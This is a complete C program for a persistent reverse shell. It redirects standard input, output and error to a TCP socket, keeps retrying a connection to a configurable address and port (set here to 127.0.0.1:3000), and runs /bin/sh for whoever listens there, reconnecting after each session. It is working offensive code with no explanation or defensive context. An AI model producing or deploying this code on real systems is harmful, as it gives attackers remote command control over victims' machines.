#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define ADDRESS "127.0.0.1"
#define PORT 3000

int shell(char* address, short port) {
  int fd;
  struct sockaddr_in server = {
    .sin_family = AF_INET,
    .sin_port = htons(port)
  };

  if(inet_pton(AF_INET, address, &server.sin_addr) <= 0 ) return -1;
  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
  if(dup2(fd, STDIN_FILENO) < 0) return -1;
  if(dup2(fd, STDOUT_FILENO) < 0) return -1;
  if(dup2(fd, STDERR_FILENO) < 0) return -1;
  while(connect(fd, (struct sockaddr*) &server, sizeof(server)) < 0) sleep(5);

  return fd;
}

int main(void) {
  char* const args[2] = {
    "/bin/sh",
    NULL
  };

  while(1) {
    int fd = shell(ADDRESS, PORT);
    pid_t p = fork();
    if(p == 0) {
      execve(args[0], args, 0);
      return 0;
    } if(p > 0) {
      waitpid(p, NULL, 0);
      close(fd);
    }
  }

  return 0;
}
